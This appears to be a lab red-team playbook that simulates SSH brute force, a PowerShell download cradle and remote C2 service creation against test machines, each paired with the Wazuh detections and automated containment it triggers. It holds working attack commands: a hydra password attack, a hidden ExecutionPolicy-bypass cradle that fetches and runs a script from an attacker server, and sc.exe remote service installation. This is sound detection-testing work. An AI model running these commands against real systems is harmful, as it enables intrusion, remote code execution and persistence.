# Red-Team Attack Scenarios & Execution Playbooks

Detailed documentation of simulated offensive tactics, techniques, and procedures (TTPs) executed against monitored endpoints.

---

## Scenario 1: SSH Brute-Force Authentication Attack

### Objective
Simulate external credential-stuffing and automated password guessing against an internet-facing Linux SSH service to test real-time brute-force correlation and automated IP blocking.

- **Target Endpoint**: `ubuntu-victim` (Ubuntu Server 24.04 LTS)
- **Target Contributor**: Mohamed Massoud
- **Attacker Machine**: Kali Linux (External subnet)
- **MITRE ATT&CK**: `T1110.001` (Password Guessing), `T1110.003` (Password Spraying)

### Execution Steps
1. **Reconnaissance & Service Enumeration**:
   ```bash
   nmap -sV -p 22 -Pn 192.168.1.110
   ```
2. **Hydra Dictionary Attack**:
   ```bash
   hydra -l massoud -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.110 -t 4 -vV
   ```
3. **Detection Outcome**:
   - Wazuh Rule `5710` (SSH authentication failure) matched repeatedly.
   - Frequency threshold reached: Wazuh Rule `5763` (Maximum authentication attempts exceeded) triggered at severity Level 10.
4. **Automated Containment**:
   - Rule `5763` escalated to Rule `651` (`firewall-drop`).
   - The attacking IP address was blocked immediately via `iptables -I INPUT -s <src_ip> -j DROP`.

---

## Scenario 2: Suspicious PowerShell Download Cradle & Bypass

### Objective
Simulate an initial-access payload execution where an adversary bypasses PowerShell ExecutionPolicy restrictions and uses an in-memory cradle (`IEX (New-Object Net.WebClient).DownloadString`) to fetch and execute a remote stage.

- **Target Endpoint**: `win11-victim` (Windows 11 Enterprise)
- **Target Contributor**: Karim
- **Attacker Host**: Simulated malicious payload server
- **MITRE ATT&CK**: `T1059.001` (PowerShell), `T1562.001` (Disable or Modify Tools), `T1105` (Ingress Tool Transfer)

### Execution Steps
1. **Execution Policy Bypass & Cradle Fetch**:
   ```powershell
   powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')"
   ```
2. **Alternate Obfuscation / Stream Execution**:
   ```powershell
   Get-Content -Path malicious.txt -Stream Payload | Invoke-Expression
   ```
3. **Detection Outcome**:
   - Sysmon Event ID 1 (Process Creation) and Windows Event ID 4104 (Script Block Logging) captured the raw command line and decoded buffer.
   - Wazuh Rule `91837` (Suspicious PowerShell string execution) and Rule `67027` (Hidden process creation) fired at severity Level 12.
4. **Automated Containment**:
   - SOAR routed alert to Wazuh Active Response.
   - Wazuh Rule `657` executed `netsh.cmd`, isolating the endpoint's network interfaces from further external lateral movement.

---

## Scenario 3: Command & Control (C2) / Remote Service Creation

### Objective
Simulate lateral movement and persistence where an attacker leverages administrative privileges or PsExec-style tooling to dynamically create and start a rogue service for command and control.

- **Target Endpoint**: `win2022-srv` (Windows Server 2022)
- **Target Contributor**: Mohamed Bushnak
- **Attacker Host**: Lateral movement simulation host
- **MITRE ATT&CK**: `T1543.003` (Windows Service), `T1021.002` (SMB/Windows Admin Shares), `T1071` (Application Layer Protocol)

### Execution Steps
1. **PsExec-Style Remote Service Installation**:
   ```cmd
   sc.exe \\192.168.1.130 create MaliciousC2Service binPath= "C:\Windows\Temp\c2_agent.exe" start= auto
   sc.exe \\192.168.1.130 start MaliciousC2Service
   ```
2. **Detection Outcome**:
   - Windows System Event ID 7045 ("A service was installed in the system") logged.
   - Wazuh Rule `92650` ("New Windows Service Created") triggered at critical Level 12.
3. **Automated Containment**:
   - Shuffle SOAR parsed the service name and target host.
   - Active Response Rule `657` executed `netsh advfirewall` rules to cut external C2 beaconing.
